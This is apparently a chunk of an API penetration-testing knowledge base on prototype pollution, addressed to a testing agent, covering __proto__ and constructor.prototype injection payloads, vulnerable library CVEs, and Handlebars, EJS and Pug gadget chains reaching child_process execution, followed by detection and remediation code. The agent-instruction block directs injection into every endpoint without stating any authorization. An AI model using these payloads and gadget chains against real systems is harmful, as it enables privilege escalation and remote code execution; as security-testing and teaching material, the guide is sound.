# Prototype Pollution in APIs — Agent Chunk 29b
> Source: 07-advanced-api-vulnerability-classes.md
> Purpose: Test Node.js/Express APIs for prototype pollution via __proto__ and constructor.prototype injection in JSON bodies and query strings, including known CVEs, gadget chains for RCE, and detection methodology
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
Test all JSON-accepting API endpoints by injecting {"__proto__":{"isAdmin":true}} and {"constructor":{"prototype":{"isAdmin":true}}} in request bodies. Test query parameters with __proto__[isAdmin]=true. Check for known vulnerable libraries: lodash (<4.17.12 merge/defaultsDeep), qs (<6.0.4), minimist, immer. For confirmed pollution, test gadget chains: pollute shell options for child_process RCE, pollute template engine options (Handlebars, Pug, EJS) for server-side template injection.

---

## 12. Prototype Pollution

### 12.1 Mechanism

Prototype pollution is a JavaScript-specific vulnerability where an attacker can modify the prototype of base objects (typically `Object.prototype`) by injecting properties through `__proto__`, `constructor`, or `prototype` properties in JSON input. Because all JavaScript objects inherit from `Object.prototype`, any property added to the prototype becomes accessible on every object in the application.

**Core mechanism:**

```javascript
// Normal object
const obj = {};
console.log(obj.isAdmin); // undefined

// Prototype pollution
const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, malicious);  // Using a recursive merge function

// Now ALL objects have isAdmin = true
const newObj = {};
console.log(newObj.isAdmin); // true - inherited from polluted prototype
```

### 12.2 __proto__ and constructor.prototype Injection via JSON

**Direct __proto__ injection:**

```json
{
  "__proto__": {
    "isAdmin": true,
    "role": "admin"
  }
}
```

When this JSON is processed by a recursive merge or deep copy function, the `__proto__` key is treated as the object's prototype, and the nested properties are added to `Object.prototype`.

**constructor.prototype injection:**

Some libraries filter `__proto__` but not `constructor`:

```json
{
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}
```

`obj.constructor` references `Object`, and `obj.constructor.prototype` references `Object.prototype`.

### 12.3 Server-Side Prototype Pollution in Node.js

**Express.js (via query string parsing):**

Express uses the `qs` library for query string parsing, which supports nested objects:

```
GET /api/search?__proto__[isAdmin]=true HTTP/1.1
```

`qs` parses this as `{__proto__: {isAdmin: "true"}}`. If this object is merged into another object without prototype pollution protection, the attack succeeds.

**Common vulnerable patterns:**

```javascript
// Vulnerable recursive merge
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// This is dangerous because __proto__ is enumerable via for...in
merge({}, JSON.parse('{"__proto__": {"polluted": true}}'));
```

### 12.4 Key CVEs

**CVE-2019-10744 — lodash (< 4.17.12):**

The `lodash.merge`, `lodash.defaultsDeep`, and `lodash.mergeWith` functions were vulnerable to prototype pollution.

```javascript
const lodash = require('lodash');
lodash.merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
// Object.prototype.isAdmin is now true
```

**CVE-2020-28477 — immer (< 8.0.1):**
The `immer` library's `produce` function could be used to pollute prototypes when processing user-controlled input.

**CVE-2022-24999 — qs (< 6.10.3):**
The `qs` query string parser (used by Express.js) did not adequately protect against prototype pollution when parsing nested parameter names:

```
?a[__proto__][polluted]=true
```

**CVE-2021-25945 — node-object-hash:**
Prototype pollution via carefully crafted objects passed to the hash function.

**CVE-2020-7788 — ini (< 1.3.6):**
The `ini` npm package was vulnerable to prototype pollution when parsing INI files with crafted section names:

```ini
[__proto__]
polluted = true
```

### 12.5 Gadget Chains for RCE

Prototype pollution alone modifies object properties. To achieve Remote Code Execution (RCE), the attacker needs a "gadget" — existing code in the application that reads the polluted property and uses it in a dangerous way.

**Handlebars RCE gadget:**

```javascript
// If the application uses Handlebars templates
// Prototype pollution sets:
Object.prototype.pendingContent = '{{constructor.constructor("return process.mainModule.require(\'child_process\').execSync(\'id\')")()}}';

// When Handlebars compiles a template, it checks for pendingContent
// and evaluates it as a template expression
```

**EJS RCE gadget:**

```javascript
// Prototype pollution sets:
Object.prototype.outputFunctionName = 'x; process.mainModule.require("child_process").execSync("id"); //';

// When EJS renders a template, it uses outputFunctionName in generated code
const ejs = require('ejs');
ejs.render('<%= "hello" %>');
// RCE achieved
```

**Pug (Jade) RCE gadget:**

```javascript
Object.prototype.block = {"type": "Text", "val": "x]); process.mainModule.require('child_process').execSync('id'); //"};
```

### 12.6 Detection and Remediation

**Detection:**
- Submit `__proto__`, `constructor`, and `prototype` keys in JSON request bodies
- Check if subsequent responses contain unexpected properties
- Monitor for new global properties on objects
- Test with automated tools: pp-finder, ppmap

**Remediation:**

```javascript
// 1. Use Object.create(null) for objects that process user input
const safeObj = Object.create(null);  // No prototype chain

// 2. Filter dangerous keys before processing
function sanitize(obj) {
  if (typeof obj !== 'object' || obj === null) return obj;
  const clean = {};
  for (const key of Object.keys(obj)) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;  // Skip dangerous keys
    }
    clean[key] = sanitize(obj[key]);
  }
  return clean;
}

// 3. Use Map instead of plain objects for dynamic key-value stores
const data = new Map();
data.set(userKey, userValue);  // Maps are not affected by prototype pollution

// 4. Freeze Object.prototype (may break some libraries)
Object.freeze(Object.prototype);

// 5. Use --disable-proto=throw Node.js flag (Node 12+)
// Throws error when __proto__ is accessed
```

```json
// package.json
{
  "scripts": {
    "start": "node --disable-proto=throw server.js"
  }
}
```
